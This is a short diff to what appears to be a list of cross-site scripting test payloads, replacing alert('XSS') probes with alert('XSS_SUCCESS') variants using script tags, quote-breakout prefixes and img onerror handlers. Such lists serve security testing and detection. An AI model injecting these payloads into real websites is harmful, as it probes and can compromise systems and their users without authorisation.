@@ -1,5 +1,6 @@
-<script>alert('XSS')</script>
-"><script>alert('XSS')</script>
-'"><script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-"><img src=x onerror=alert('XSS')>
+<script>alert('XSS_SUCCESS')</script>
+"><script>alert('XSS_SUCCESS')</script>
+'><script>alert('XSS_SUCCESS')</script>
+<img src=x onerror=alert('XSS_SUCCESS')>
+"><img src=x onerror=alert('XSS_SUCCESS')>
+'><img src=x onerror=alert('XSS_SUCCESS')>
